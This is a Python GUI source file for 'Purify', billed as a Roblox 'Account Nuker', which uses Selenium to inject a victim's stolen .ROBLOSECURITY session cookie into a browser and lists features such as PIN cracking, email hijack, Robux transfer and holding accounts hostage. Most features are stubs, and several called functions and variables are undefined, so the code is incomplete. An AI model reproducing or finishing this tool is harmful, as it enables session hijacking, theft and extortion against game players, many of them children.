from pathlib import Path
from tkinter import Tk, Canvas, Entry, Text, Button, PhotoImage
import os
import requests
import time
from colorama import Fore ,Style ,init
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from selenium.webdriver.chrome.service import Service as ChromeService
from webdriver_manager.chrome import ChromeDriverManager
from colorama import Fore, Style, Back, init

####################################################

####################################################

OUTPUT_PATH = Path(__file__).parent
ASSETS_PATH = OUTPUT_PATH / Path(r"C:\Users\liamb\purify\build\assets\frame0")

caps = DesiredCapabilities.CHROME.copy()
caps["goog:loggingPrefs"] = {"browser": "ALL"}

options = uc.ChromeOptions()
options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36')

pinurl = 'https://auth.roblox.com/v1/account/pin/unlock'
token = requests.post('https://auth.roblox.com/v1/login', cookies = {".ROBLOSECURITY":newcookie})
xcrsf = (token.headers['x-csrf-token'])
header = {'X-CSRF-TOKEN': xcrsf}

driver = uc.Chrome(
    service=ChromeService(ChromeDriverManager().install(), port=9222),
    desired_capabilities=caps,
    options=options
)

init()

print(Fore.LIGHTRED_EX + "DO NOT CLOSE THE CHROME WINDOW!" + Style.RESET_ALL)
print(Fore.LIGHTRED_EX + "DO NOT CLOSE THE CHROME WINDOW!" + Style.RESET_ALL)
print(Fore.LIGHTRED_EX + "DO NOT CLOSE THE CHROME WINDOW!" + Style.RESET_ALL)
print(Fore.LIGHTRED_EX + "DO NOT CLOSE THE CHROME WINDOW!" + Style.RESET_ALL)
print(Fore.LIGHTRED_EX + "DO NOT CLOSE THE CHROME WINDOW!" + Style.RESET_ALL)
print(Fore.LIGHTRED_EX + "DO NOT CLOSE THE CHROME WINDOW!" + Style.RESET_ALL)
print(Fore.LIGHTRED_EX + " " + Style.RESET_ALL)
username = input(Fore.LIGHTRED_EX + "Make an ALT account, and provide the username here: " + Style.RESET_ALL)
password = input(Fore.LIGHTRED_EX + "Now, provide the password to the account here: " + Style.RESET_ALL)

#################################################################################

def relative_to_assets(path: str) -> Path:
    return ASSETS_PATH / Path(path)

def clear ():
    os .system ('cls'if os .name =='nt'else 'clear')

clear()

def login():
    roblosecurity = entry_1.get()

    driver.get("https://roblox.com/login")

    driver.find_element(By.CSS_SELECTOR, '#login-username').send_keys(username)
    time.sleep(0.2)
    driver.find_element(By.CSS_SELECTOR, '#login-password').send_keys(password)
    time.sleep(0.2)
    driver.find_element(By.CSS_SELECTOR, '#login-button').click()
    time.sleep(3)
    try:
        error_element = driver.find_element(By.CSS_SELECTOR, '#login-form-error')
        if error_element.is_displayed():
            driver.quit()
            print(Fore.LIGHTRED_EX + " > Password or username invalid, please close the application and try again." + Style.RESET_ALL)
            return
    except NoSuchElementException:
        print(Fore.LIGHTGREEN_EX + " > Valid password/username, or took to long to respond." + Style.RESET_ALL)
        pass
    print(Fore.LIGHTGREEN_EX + " > Complete the captcha if shown." + Style.RESET_ALL)

    input(Fore.LIGHTGREEN_EX + " > Please click [ENTER] when you're logged in, at the home page!" + Style.RESET_ALL)

    cookies = driver.get_cookies()

    for cookie in cookies:
        if cookie['name'] == '.ROBLOSECURITY':
            # Update the cookie value
            cookie['value'] = roblosecurity
            # Update the cookie in the browser
            driver.add_cookie(cookie)
            break


#################################################################################




window = Tk()
window.geometry("800x465")
window.configure(bg = "#111111")
window.title("Purify - #1 Roblox Account Nuker | v1.0.0 | Status: Lifetime Key") 
window.iconbitmap(relative_to_assets("icon.ico"))


canvas = Canvas(
    window,
    bg = "#111111",
    height = 465,
    width = 800,
    bd = 0,
    highlightthickness = 0,
    relief = "ridge"
)

canvas.place(x = 0, y = 0)
canvas.create_rectangle(
    0.0,
    0.0,
    800.0,
    40.0,
    fill="#0B0B0B",
    outline="")

image_image_1 = PhotoImage(
    file=relative_to_assets("redfade.png"))
image_1 = canvas.create_image(
    400.0,
    337.0,
    image=image_image_1
)

canvas.create_text(
    6.0,
    2.0,
    anchor="nw",
    text="Purify v.1.0.0",
    fill="#FF6969",
    font=("Poppins Medium", 30 * -1)
)

button_image_1 = PhotoImage(
    file=relative_to_assets("printdetails.png"))
button_1 = Button(
    image=button_image_1,
    borderwidth=0,
    highlightthickness=0,
    command=lambda: print("button_1 clicked"),
    relief="flat"
)
button_1.place(
    x=48.0,
    y=164.0,
    width=145.0,
    height=45.0
)

button_image_2 = PhotoImage(
    file=relative_to_assets("banacc.png"))
button_2 = Button(
    image=button_image_2,
    borderwidth=0,
    highlightthickness=0,
    command=lambda: print("button_2 clicked"),
    relief="flat"
)
button_2.place(
    x=48.0,
    y=245.0,
    width=145.0,
    height=45.0
)

button_image_3 = PhotoImage(
    file=relative_to_assets("nukeacc.png"))
button_3 = Button(
    image=button_image_3,
    borderwidth=0,
    highlightthickness=0,
    command=lambda: print("button_3 clicked"),
    relief="flat"
)
button_3.place(
    x=236.0,
    y=164.0,
    width=145.0,
    height=45.0
)

button_image_4 = PhotoImage(
    file=relative_to_assets("unfriend.png"))
button_4 = Button(
    image=button_image_4,
    borderwidth=0,
    highlightthickness=0,
    command=lambda: print("button_4 clicked"),
    relief="flat"
)
button_4.place(
    x=236.0,
    y=245.0,
    width=145.0,
    height=45.0
)

button_image_5 = PhotoImage(
    file=relative_to_assets("joindiscord.png"))
button_5 = Button(
    image=button_image_5,
    borderwidth=0,
    highlightthickness=0,
    command=lambda: print("button_5 clicked"),
    relief="flat"
)
button_5.place(
    x=48.0,
    y=373.0,
    width=711.0,
    height=48.0
)

button_image_6 = PhotoImage(
    file=relative_to_assets("pincracker.png"))
button_6 = Button(
    image=button_image_6,
    borderwidth=0,
    highlightthickness=0,
    command=lambda: pincracker(),
    relief="flat"
)
button_6.place(
    x=424.0,
    y=164.0,
    width=145.0,
    height=45.0
)

button_image_7 = PhotoImage(
    file=relative_to_assets("emailhijack.png"))
button_7 = Button(
    image=button_image_7,
    borderwidth=0,
    highlightthickness=0,
    command=lambda: print("button_7 clicked"),
    relief="flat"
)
button_7.place(
    x=424.0,
    y=245.0,
    width=145.0,
    height=45.0
)

button_image_8 = PhotoImage(
    file=relative_to_assets("transferbux.png"))
button_8 = Button(
    image=button_image_8,
    borderwidth=0,
    highlightthickness=0,
    command=lambda: print("button_8 clicked"),
    relief="flat"
)
button_8.place(
    x=612.0,
    y=164.0,
    width=145.0,
    height=45.0
)

button_image_9 = PhotoImage(
    file=relative_to_assets("login.png"))
button_9 = Button(
    image=button_image_9,
    borderwidth=0,
    highlightthickness=0,
    command=lambda: login(),
    relief="flat"
)
button_9.place(
    x=612.0,
    y=88.0,
    width=145.0,
    height=40.0
)

button_image_10 = PhotoImage(
    file=relative_to_assets("holdhostage.png"))
button_10 = Button(
    image=button_image_10,
    borderwidth=0,
    highlightthickness=0,
    command=lambda: holdhostage(),
    relief="flat"
)
button_10.place(
    x=612.0,
    y=245.0,
    width=145.0,
    height=45.0
)

canvas.create_text(
    310.0,
    62.0,
    anchor="nw",
    text="Victim’s RobloSecuirty:",
    fill="#FF6969",
    font=("Poppins Medium", 15 * -1)
)
window.resizable(False, False)
window.mainloop()
